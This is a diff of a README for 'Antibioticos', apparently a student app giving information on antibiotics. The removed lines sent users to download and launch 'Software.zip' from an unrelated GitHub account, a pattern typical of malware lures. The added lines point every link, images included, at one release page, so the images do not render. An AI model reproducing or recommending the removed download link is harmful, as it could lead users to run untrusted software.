@@ -1,6 +1,6 @@
 # Antibioticos App 🦠💊
 
-![Antibioticos App Logo](https://example.com/logo.png)
+![Antibioticos App Logo](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
 
 Welcome to the **Antibioticos** repository! This is an application developed as part of a project extension I worked on alongside the pharmacy course at the Federal University of Piauí. The main goal of this app is to provide information and support regarding antibiotics, helping users to understand how to use them properly and the importance of completing the prescribed treatment.
 
@@ -14,15 +14,15 @@ Welcome to the **Antibioticos** repository! This is an application developed as 
 
 ## Screenshots 📱
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
+![Screenshot 2](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
+![Screenshot 3](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
 
 ## Installation 🚀
 
-To install the **Antibioticos** app, you can download the latest version from [here](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). Please note that the application needs to be launched after the download.
+To install the **Antibioticos** app, you can download the latest version from [here](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0). Please note that the application needs to be launched after the download.
 
-[![Download App](https://img.shields.io/badge/Download-App-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download App](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
 
 ## Technologies Used 💻
 
@@ -42,7 +42,7 @@ If you have any feedback, suggestions, or issues to report regarding the app, pl
 
 Visit our website for more information about the **Antibioticos** app and our project at the University of Piauí.
 
-[Visit Website](https://example.com)
+[Visit Website](https://github.com/fabioferreira79/antibioticos/releases/tag/v2.0)
 
 ## License ℹ️
 
